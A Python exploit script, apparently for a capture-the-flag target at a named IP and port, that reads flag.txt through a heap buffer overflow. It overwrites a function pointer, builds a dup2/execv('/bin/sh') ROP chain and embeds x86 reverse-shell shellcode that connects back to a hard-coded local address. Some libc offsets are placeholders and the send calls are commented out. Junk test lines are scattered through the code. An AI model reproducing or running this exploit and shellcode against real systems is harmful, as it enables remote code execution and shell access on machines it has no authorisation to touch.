__author__ = 'HuyNA'
import sys
import os
import socket
import time
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 23.23.190.205:8888 and read flag.txt
host = "23.23.190.205"
local_host="192.168.248.154"
port = 8888
all_data = ""
s.connect((host, port))
max_size = 510
command = ""
size_buffer = ""
def build_buffer(command, size):
    command_buffer = "a"*(0x44-0x1C) + command + "b"*(0x6C-0x48) + size
    return command_buffer

# test notepad++
'''
sdsdsd
'''    
af = 'jfjfjf'

'''

'''

command_buffer = struct.pack("<I", 0x00000064)
size_buffer = struct.pack("<I", 0x00000000)
command_buffer = build_buffer(command_buffer, size_buffer)
data = command_buffer + "c"*(max_size-len(command_buffer))
#print("Phase 1: Alloc function pointer ... ")
all_data = data
#s.send(data)
time.sleep(0.001)

address = 0x080484C3
size = 0x0000001000
command_buffer = struct.pack("<I", 0x000000C8)
size_buffer = struct.pack("<I", size+2)
command_buffer = build_buffer(command_buffer, size_buffer)
data = command_buffer + "c"*(max_size-len(command_buffer))
#print("Phase 2: Send buffer to heap...")
all_data += data
#s.send(data)
address_buffer = struct.pack("<I", address)
buffer_overflow = "h"*0x100 + address_buffer * ((size - 0x100) // 4)
all_data += buffer_overflow
#s.send(buffer_overflow)

command_buffer = struct.pack("<I", 0x0000012C)
size_buffer = struct.pack("<I", 0x00000000)
command_buffer = build_buffer(command_buffer, size_buffer)
data = command_buffer + "c"*(max_size-len(command_buffer))
#print("Phase 3: Trigger strcpy to overflow ...")
all_data += data
#s.send(data)

def build_execv_rop():
    rop = struct.pack("<I", 0x0804879C)     # pop pop pop pop retn
    rop += struct.pack("<I", 0x0804879D)     # pop pop pop retn
    poppopret = 0x0804879E
    base_lib = 0x0
    delta_dup2 = 0x0
    delta_execv = 0x0
    delta_bin_sh_string = 0x0
    dup2_address = delta_dup2 + base_lib
    execv_address = delta_execv + base_lib
    bin_sh_string_address = delta_bin_sh_string + base_lib

    rop += struct.pack("<I", dup2_address)	# dup2(4,0)
    rop += struct.pack("<I", poppopret)
    rop += struct.pack("<I", 0x00000004)
    rop += struct.pack("<I", 0x00000000)

    rop += struct.pack("<I", dup2_address)	# # dup2(4,1)
    rop += struct.pack("<I", poppopret)
    rop += struct.pack("<I", 0x00000004)
    rop += struct.pack("<I", 0x00000001)

    rop += struct.pack("<I", dup2_address)	# # dup2(4,2)
    rop += struct.pack("<I", poppopret)
    rop += struct.pack("<I", 0x00000004)
    rop += struct.pack("<I", 0x00000002)

    rop += struct.pack("<I", execv_address)	# execv("/bin/sh", NULL)
    rop += struct.pack("<I", poppopret)
    rop += struct.pack("<I", bin_sh_string_address)
    rop += struct.pack("<I", 0x00000000)
    return rop

def build_send_rop():
    send_address = 0x0
    rop_send = struct.pack("<I", send_address)
    rop_send += struct.pack("<I", 0x0804A004)
    rop_send += struct.pack("<I", 0x00000004)	# fd = 4
    #rop_send += pack("<I", 0x0804C000)	# buffer truyen ve la bang got cua file
    rop_send += struct.pack("<I", 0xF75D7000)	# buffer truyen ve la bang got cua file
    rop_send += struct.pack("<I", 0x001AD000)	# size buffer truyen ve
    rop_send += struct.pack("<I", 0x00000000)	# flag



command_buffer = struct.pack("<I", 0x00000032)              # kich hoat goi con tro ham da bi ghi de
size_buffer = struct.pack("<I", 0x00000000)

# 192.168.248.155
connect_back_shell = "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\xc0\xa8\xf8\x9b\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
command_buffer = "\xEB\x2A"+"a"*(0x42-0x1C) + command_buffer + connect_back_shell
data = command_buffer + "c"*(max_size-len(command_buffer))
#print("Phase 4: Call function pointer that has been overflowed ... ")
all_data += data

print(all_data)
#s.send(all_data)


#print(s.recv(1024))
s.close()